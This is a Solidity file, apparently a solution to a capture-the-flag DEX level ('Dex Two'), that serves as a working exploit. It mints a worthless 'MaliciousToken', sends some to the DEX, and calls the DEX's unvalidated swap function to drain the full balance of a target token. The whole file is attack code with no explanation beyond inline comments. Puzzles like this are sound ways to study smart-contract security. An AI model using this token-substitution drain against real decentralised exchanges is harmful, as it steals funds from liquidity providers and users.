// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract MaliciousToken is ERC20 {
    constructor() ERC20("Malicious", "MAL") {
        // Mint tokens to the attacker (msg.sender)
        _mint(msg.sender, 1000000 * 10**18);
    }
}

contract DexTwoAttack {
    address public dex;
    address public token1;
    address public token2;
    MaliciousToken public malToken;
    
    constructor(address _dex) {
        dex = _dex;
        malToken = new MaliciousToken();
    }
    
    function attack() external {
        // First, we need to get the token addresses from the DEX
        // Since they might not be set, we'll need to handle this
        
        // Transfer some malicious tokens to the DEX to set up the attack
        malToken.transfer(dex, 100);
        
        // Approve the DEX to spend our malicious tokens
        malToken.approve(dex, type(uint256).max);
    }
    
    function drainToken(address targetToken) external {
        // Get the balance of the target token in the DEX
        uint256 dexBalance = IERC20(targetToken).balanceOf(dex);
        
        // Calculate how much malicious token we need to swap to get all target tokens
        // Since swapAmount = (amount * to.balance) / from.balance
        // We want swapAmount = dexBalance (all tokens in DEX)
        // So: dexBalance = (amount * dexBalance) / malToken.balance
        // Therefore: amount = malToken.balance
        
        uint256 malTokenBalance = malToken.balanceOf(dex);
        
        // Call swap on the DEX
        (bool success,) = dex.call(
            abi.encodeWithSignature(
                "swap(address,address,uint256)",
                address(malToken),
                targetToken,
                malTokenBalance
            )
        );
        require(success, "Swap failed");
    }
    
    function getTokenAddresses() external {
        (bool success1, bytes memory data1) = dex.call(abi.encodeWithSignature("token1()"));
        if (success1 && data1.length > 0) {
            token1 = abi.decode(data1, (address));
        }
        
        (bool success2, bytes memory data2) = dex.call(abi.encodeWithSignature("token2()"));
        if (success2 && data2.length > 0) {
            token2 = abi.decode(data2, (address));
        }
    }
}